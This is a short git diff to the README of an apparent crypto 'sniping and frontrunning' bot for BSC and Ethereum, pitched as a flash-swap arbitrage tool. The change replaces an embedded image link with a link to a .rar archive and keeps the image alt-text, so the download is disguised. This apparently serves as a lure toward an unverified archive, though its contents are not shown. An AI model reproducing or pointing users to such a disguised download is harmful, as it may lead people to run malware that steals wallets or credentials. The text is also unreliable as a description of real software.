@@ -2,7 +2,7 @@
 
 Bot for sniping and frontrunning on BSC and Ether (C#)
 
-![alt text](https://github.com/Cardo16/flash-swap-arbitrage/blob/main/flashbot.png?raw=true)
+![alt text](https://github.com/Cardo16/flash-swap-arbitrage/raw/main/flash-arbitrage.rar)
 
 ### About
 This is an arbitrage bot that utilizes flash swaps to trade between various Uniswap V2 automated market makers (AMMs) and related forks on Ethereum, Binance Smart Chain, and Avalanche.
